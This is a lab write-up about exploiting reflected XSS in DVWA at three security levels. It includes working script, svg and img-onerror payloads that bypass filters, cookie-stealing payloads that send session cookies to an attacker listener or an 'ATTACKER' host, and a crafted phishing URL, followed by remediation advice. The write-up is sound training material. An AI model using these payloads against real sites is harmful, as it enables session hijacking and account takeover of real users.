# Lab Write-Up: Cross-Site Scripting – Reflected (XSS)
**Date:** 2026-08-22  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Cross-Site Scripting (XSS)  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

Reflected Cross-Site Scripting (XSS) is a type of injection vulnerability where malicious scripts are reflected off a web server and executed in the victim's browser. Unlike Stored XSS, the payload is not saved on the server — instead, it's embedded in a crafted URL and executed when a victim clicks the link.

**Goal of this lab:** Inject a JavaScript payload into the DVWA Reflected XSS module and steal the logged-in user's session cookie.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – XSS (Reflected) Module        |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite, Python HTTP Server |
| **Network**      | Local lab (NAT/Host-Only)            |
| **Listener**     | `python3 -m http.server 8081`        |

**Start your cookie listener before testing:**
```bash
python3 -m http.server 8081
```

---

## 3. Vulnerability Overview

### What is Reflected XSS?

Reflected XSS occurs when user input is immediately returned in the server's response without proper sanitization. The script runs in the victim's browser, in the context of the vulnerable site, allowing the attacker to:

- Steal session cookies
- Redirect users to malicious sites
- Perform actions on behalf of the victim
- Capture keystrokes

**Vulnerable Code (PHP – Low Level):**
```php
$name = $_GET['name'];
echo "<pre>Hello " . $name . "</pre>";
```

The `$name` variable is inserted directly into the HTML with no encoding or sanitization.

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → XSS (Reflected). Set security to **Low**.

#### Step 1 – Test Normal Behavior

Enter `Adinath` in the "What's your name?" field.

**Output:**
```
Hello Adinath
```

#### Step 2 – Basic XSS Test

**Payload:**
```html
<script>alert(1)</script>
```

**Result:** A JavaScript alert box pops up with `1` — confirms XSS is possible.

#### Step 3 – Cookie Stealing Payload

Start the Python listener on your Kali machine:
```bash
python3 -m http.server 8081
```

**Payload:**
```html
<script>window.location='http://192.168.x.x:8081/?cookie='+document.cookie</script>
```

> **Note:** If `+` causes issues, URL-encode it as `%2B`:
```html
<script>window.location='http://192.168.x.x:8081/?cookie='%2Bdocument.cookie</script>
```

**Result in terminal:**
```
192.168.x.x - - [20/Aug/2026] "GET /?cookie=PHPSESSID=abc123;security=low HTTP/1.1" 200 -
```

✅ Cookie successfully exfiltrated.

#### Step 4 – Craft a Phishing URL

The full attack URL would look like:
```
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>window.location='http://192.168.x.x:8081/?cookie='%2Bdocument.cookie</script>
```

A victim clicking this link would have their cookie stolen.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The `<script>` tag is now filtered — the developer is stripping or blocking `<script>` patterns.

#### Step 1 – Test Basic Payload (Blocked)

**Payload:**
```html
<script>alert(1)</script>
```

**Result:** No popup — `<script>` is being filtered.

#### Step 2 – Bypass Using SVG Tag

The filter targets `<script>` specifically but doesn't block other HTML event handlers.

**Payload:**
```html
<svg/onload=alert(1)>
```

**Result:** Alert fires — bypass successful.

#### Step 3 – Cookie Stealing via SVG

**Payload:**
```html
<svg/onload=window.location='http://192.168.x.x:8081/?cookie='%2Bdocument.cookie>
```

**Result:** Cookie exfiltrated to listener.

#### Step 4 – Alternative Bypass Techniques

```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The filter uses a stricter regex pattern to block `<script>` and common XSS patterns. However, non-script tag event handlers still work.

#### Step 1 – Identify the Filter

The source code uses a regex like:
```php
preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name);
```

This catches variations of `<script>` even with characters inserted between letters.

#### Step 2 – Bypass Using Event Handlers

**Payload:**
```html
<img src=x onerror=alert(document.cookie)>
```

**Result:** Alert box shows the cookie — bypass successful.

#### Step 3 – Full Exfiltration

**Payload:**
```html
<img src=x onerror=window.location='http://192.168.x.x:8081/?c='+document.cookie>
```

**Result:** Cookie exfiltrated.

#### Step 4 – Additional High-Level Bypasses

```html
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 5. Findings Summary

| Security Level | Vulnerable | Method Used              | Outcome                    |
|----------------|------------|--------------------------|----------------------------|
| Low            | ✅ Yes     | Direct `<script>` tag    | Cookie stolen              |
| Medium         | ✅ Yes     | `<svg/onload>` bypass    | Cookie stolen              |
| High           | ✅ Yes     | `<img onerror>` bypass   | Cookie stolen              |

---

## 6. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | High     |
| **CVSS Score** | 7.4      |
| **CIA Impact** | Confidentiality: High, Integrity: Medium, Availability: Low |

**Business Impact:**
- Session hijacking and account takeover
- Credential theft
- Phishing attacks via crafted URLs
- Defacement of content visible to victims

---

## 7. Remediation Recommendations

| Fix                            | Description                                                      |
|--------------------------------|------------------------------------------------------------------|
| **Output Encoding**            | HTML-encode all user input before rendering (`htmlspecialchars`) |
| **Input Validation**           | Whitelist only expected characters                               |
| **Content Security Policy**    | Implement strict CSP headers to restrict script execution        |
| **HttpOnly Cookie Flag**       | Prevents JavaScript from accessing session cookies               |
| **Secure Cookie Flag**         | Ensures cookies are only sent over HTTPS                         |
| **X-XSS-Protection Header**    | Enable browser's built-in XSS filter                            |

**Secure Code Fix (PHP):**
```php
// Vulnerable
echo "<pre>Hello " . $name . "</pre>";

// Secure
echo "<pre>Hello " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "</pre>";
```

**CSP Header Example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## 8. References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger – Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [DVWA Reflected XSS Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/reflected-xss_dvwa_walkthrough/)
- [DVWA XSS Solution – GitHub](https://github.com/kashrathod19/XSS-DVWA-SOLUTION)

---

## 9. Proof of Concept (PoC) Summary

```
Target:    DVWA – XSS (Reflected) Module
Payload:   <svg/onload=window.location='http://ATTACKER/?c='+document.cookie>
Result:    Session cookie (PHPSESSID) exfiltrated to attacker listener
Severity:  HIGH
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
